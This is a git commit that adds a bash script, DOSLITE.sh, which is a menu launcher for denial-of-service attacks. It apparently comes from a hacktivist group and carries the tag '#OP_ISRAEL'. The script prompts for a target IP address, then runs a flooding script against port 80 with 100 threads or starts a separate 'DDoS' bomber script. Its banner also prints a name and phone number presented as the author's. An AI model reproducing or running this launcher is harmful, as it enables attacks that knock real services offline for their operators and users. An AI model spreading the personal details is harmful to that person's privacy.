8ce53dcb92c052830e90006cb4a8985db07f5f78
BPCATTACKER <49661920+BPCATTACKER@users.noreply.github.com>
2019-05-16 17:59:06 +0700

    Add files via upload

---
+++ DOSLITE.sh
@@ -0,0 +1,95 @@
+"""
+Copyright [2019] [ALINET]
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+ http://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+"""
+clear
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+
+toilet -f standard " ALINET LITE "
+echo
+echo
+echo $green"==========================================="
+echo $red"DoS AND DDoS ATTACK LAUCH VIA TOOL ALINET"
+echo $green"==========================================="
+echo $red"===    ===    ===    ===   ===    ===   ==="
+echo $white"===    ===    ===    ===   ===    ===   ==="
+            echo $red"        ____...------------...____"
+            echo $red"   _:-:: /o/ ---------------- \o\_ :-:_" 
+            echo $green" .:     / / SC BY 2EUS666GH05T \ \     :."
+            echo $red" |=====/o/======================\o\=====|" 
+            echo $red" |____/_/________..____..________\_\____|" 
+            echo $red" :   _/ \_     :_oβ:__:βo_:     _/ \_   :" 
+            echo $green" \__/_____\####/ALINET V2.4.0/####/__\__/"
+            echo $yellow"  |===\!/========================\!/===|"
+            echo $red"  |   |=|          .---.         |=|   |" 
+            echo $cyan"  |===|o|=========/     \========|o|===|  " 
+            echo $cyan"  |   | |         \() ()/        | |   |  " 
+            echo $cyan"  |===|o|======{:-.) A (.-:}=====|o|===|  " 
+            echo $cyan"  | __/ \__     :-.\uuu/.-:    __/ \__ |  " 
+            echo $cyan"  |==== .:.:::.:.====|====.:.:::.:.====|  " 
+            echo $cyan"  |  _\o/   __  {.: __  :.} _   _\o/  _|  " 
+            echo $red"  ''''''''''''''''''''''''''''''''''''''  " 
+
+echo
+echo 
+echo "=================================" |lolcat
+echo $yellow"DOS BOTNET AND DDOS ATTACK"
+echo "=================================" |lolcat
+echo $red"CREATED=zeus666Gh05t/mr.spoon"
+echo $red"NAME REAL=HENDRIK PURWANTO"
+echo $red"VERSION=0.1"
+echo $red"TEAM=BLACK PHANTOM CYBER"
+echo $red"WHATSAPP=+6287856793527"
+echo $purple"SPECIAL #OP_ISRAEL"
+echo "=================================" |lolcat
+echo
+echo $cyan"---------------------------------"
+echo $green"           LIST MENU            "
+echo $cyan"---------------------------------"
+echo $cyan"[1].DOS BOTNET ATTACK"
+echo $cyan"[2].DDOS ATTACK ARMAGEDON LEVEL"
+echo $cyan"[3].EXIT"
+echo $cyan"---------------------------------"
+echo $white "╭─"$yellow"ALINET@USER"
+read -p " ╰─> " pil
+
+#DOS BOTNET
+
+if [ $pil = 1 ] || [ $pil = 1 ]
+then
+clear
+toilet -f slant "DoS BotneT attack" -F metal
+echo
+echo $cyan"MASUKAN IP TARGET"
+read -p "==>" ip;
+python NET.py -s$ip -p80 -t100
+fi
+
+
+#DDOS
+
+if [ $pil = 2 ] || [ $pil = 2 ]
+then
+clear
+toilet -f slant "DDoS attack" -F metal
+echo
+python2 BOMBER.py
+fi
+
